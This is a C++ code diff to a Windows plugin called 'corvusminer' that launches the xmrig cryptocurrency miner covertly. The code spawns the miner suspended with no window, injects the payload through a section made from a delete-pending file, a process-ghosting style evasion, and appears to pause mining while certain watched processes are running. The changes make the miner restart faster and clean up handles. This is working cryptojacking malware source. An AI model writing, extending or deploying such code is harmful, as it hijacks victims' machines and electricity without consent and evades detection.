@@ -101,6 +101,7 @@ static std::string g_password;
 static int g_threads_hint = 100;
 static std::string g_xmrig_path;
 static HANDLE g_monitor_thread = nullptr;
+static HANDLE g_wake_event = nullptr;   /* signaled to wake monitor thread immediately */
 static bool g_monitor_running = false;
 static bool g_should_be_mining = false;
 static bool g_mining_start_pending = false;  /* Track if we need to spawn on monitor thread */
@@ -197,8 +198,15 @@ static DWORD WINAPI monitor_thread_proc(LPVOID param) {
     fprintf(stderr, "[corvusminer] monitor thread started\n");
     
     while (g_monitor_running) {
-        Sleep(5000); /* Check every 5 seconds */
-        
+        /* Wait up to 5 s, but wake immediately when g_wake_event is signaled */
+        if (g_wake_event) {
+            WaitForSingleObject(g_wake_event, 5000);
+            ResetEvent(g_wake_event);
+        } else {
+            Sleep(5000);
+        }
+
+        if (!g_monitor_running) break;
         if (!g_should_be_mining) continue;
         
         std::vector<std::string> blocked_procs;
@@ -222,19 +230,19 @@ static DWORD WINAPI monitor_thread_proc(LPVOID param) {
         fprintf(stderr, "[corvusminer] monitor check: pending=%d, blocked_running=%d, miner_running=%d, should_be=%d, processes_to_watch=%zu\n",
                 mining_start_pending, blocked_running, miner_running, g_should_be_mining, blocked_procs.size());
         
-        /* Handle initial mining_start request */
-        if (mining_start_pending && !miner_running) {
-            fprintf(stderr, "[corvusminer] spawning miner from mining_start request\n");
+        /* Handle mining_start request — restart with new config even if already running */
+        if (mining_start_pending) {
+            fprintf(stderr, "[corvusminer] spawning miner from mining_start request (miner_running=%d)\n", miner_running);
             bool success = spawn_xmrig(pool, username, password, threads_hint, blocked_procs, xmrig_path, false);
             {
                 std::lock_guard<std::mutex> lk(g_mu);
                 g_mining_start_pending = false;
             }
             if (success) {
-                fprintf(stderr, "[corvusminer] initial spawn successful\n");
+                fprintf(stderr, "[corvusminer] spawn successful\n");
                 send_event("mining_started", "{\"message\":\"Mining started\"}");
             } else {
-                fprintf(stderr, "[corvusminer] initial spawn failed\n");
+                fprintf(stderr, "[corvusminer] spawn failed\n");
                 send_event("mining_error", "{\"error\":\"Failed to start mining\"}");
             }
         } else if (blocked_running && miner_running) {
@@ -496,29 +504,15 @@ static bool spawn_xmrig(const std::string &pool, const std::string &username,
                     wchar_t *last_sep = wcsrchr(start_dir, L'\\');
                     if (last_sep) *last_sep = L'\0';
 
-                    fprintf(stderr, "[corvusminer] calling CreateProcessInternalW (quoted cmd, DETACHED_PROCESS|CREATE_NO_WINDOW)\n");
+                    fprintf(stderr, "[corvusminer] calling CreateProcessW (quoted cmd, CREATE_SUSPENDED|DETACHED_PROCESS|CREATE_NO_WINDOW)\n");
                     fflush(stderr);
 
                     /* Zero out pi */
                     memset(&pi, 0, sizeof(pi));
 
-                    HANDLE hNewToken = NULL;
-                    BOOL proc_created = FALSE;
-                    if (load_kernel32_functions()) {
-                        proc_created = g_CreateProcessInternalW(NULL,
-                            NULL,       /* lpApplicationName */
-                            cmd_wide,   /* lpCommandLine */
-                            NULL, NULL, FALSE,
-                            CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
-                            NULL,
-                            start_dir,
-                            &si, &pi, &hNewToken);
-                    } else {
-                        fprintf(stderr, "[corvusminer] CreateProcessInternalW not found, falling back to CreateProcessW\n");
-                        proc_created = CreateProcessW(NULL, cmd_wide, NULL, NULL, FALSE,
-                            CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
-                            NULL, start_dir, &si, &pi);
-                    }
+                    BOOL proc_created = CreateProcessW(NULL, cmd_wide, NULL, NULL, FALSE,
+                        CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
+                        NULL, start_dir, &si, &pi);
 
                     fprintf(stderr, "[corvusminer] CreateProcess returned: %d (err=0x%lX)\n", (int)proc_created, proc_created ? 0 : GetLastError());
                     fflush(stderr);
@@ -534,7 +528,7 @@ static bool spawn_xmrig(const std::string &pool, const std::string &username,
                         /* Map section into process using proven helper */
                         fprintf(stderr, "[corvusminer] mapping section into process (file_size=%lu)...\n", (DWORD)file_size);
                         fflush(stderr);
-                        PVOID remote_base = map_section_into_process(pi.hProcess, h_section, (DWORD)file_size);
+                        PVOID remote_base = map_section_into_process(pi.hProcess, h_section, (DWORD)file_size, payload_buf);
                         fprintf(stderr, "[corvusminer] map_section_into_process returned: %p\n", remote_base);
                         fflush(stderr);
                         if (remote_base) {
@@ -549,6 +543,7 @@ static bool spawn_xmrig(const std::string &pool, const std::string &username,
                                 if (ResumeThread(pi.hThread)) {
                                     g_mining_process = pi.hProcess;
                                     CloseHandle(pi.hThread);
+                                    CloseHandle(h_section);
                                     delete[] payload_buf;
                                     
                                     std::string pid_msg = "{\"pid\":" + std::to_string(pi.dwProcessId) + "}";
@@ -577,6 +572,7 @@ static bool spawn_xmrig(const std::string &pool, const std::string &username,
                         DWORD err = GetLastError();
                         fprintf(stderr, "[corvusminer] CreateProcess failed: 0x%lX\n", err);
                     }
+                    CloseHandle(h_section);
                 } else {
                     fprintf(stderr, "[corvusminer] failed to create section from payload (make_section_from_delete_pending_file returned nullptr)\n");
                 }
@@ -712,6 +708,10 @@ EXPORT int PluginOnLoad(const char *hostInfo, int hostInfoLen,
     
     /* Start monitor thread */
 #ifdef _WIN32
+    g_wake_event = CreateEventW(nullptr, /*manualReset=*/TRUE, /*initialState=*/FALSE, nullptr);
+    if (!g_wake_event) {
+        fprintf(stderr, "[corvusminer] failed to create wake event\n");
+    }
     g_monitor_running = true;
     g_monitor_thread = CreateThread(nullptr, 0, monitor_thread_proc, nullptr, 0, nullptr);
     if (!g_monitor_thread) {
@@ -773,6 +773,8 @@ EXPORT int PluginOnEvent(const char *event, int eventLen,
         }
         
         fprintf(stderr, "[corvusminer] queued mining_start for monitor thread\n");
+        /* Wake the monitor thread immediately so it doesn't wait up to 5 s */
+        if (g_wake_event) SetEvent(g_wake_event);
         return 0;
     }
 
@@ -810,10 +812,16 @@ EXPORT void PluginOnUnload() {
     
     /* Stop monitor thread */
     g_monitor_running = false;
+    if (g_wake_event) SetEvent(g_wake_event);  /* unblock WaitForSingleObject immediately */
     if (g_monitor_thread != nullptr) {
-        WaitForSingleObject(g_monitor_thread, 5000);
+        /* Wait long enough for an in-progress spawn (6 MB write + section create) to finish */
+        WaitForSingleObject(g_monitor_thread, 30000);
         CloseHandle(g_monitor_thread);
         g_monitor_thread = nullptr;
+    }
+    if (g_wake_event) {
+        CloseHandle(g_wake_event);
+        g_wake_event = nullptr;
     }
     
     /* Clear mining config */
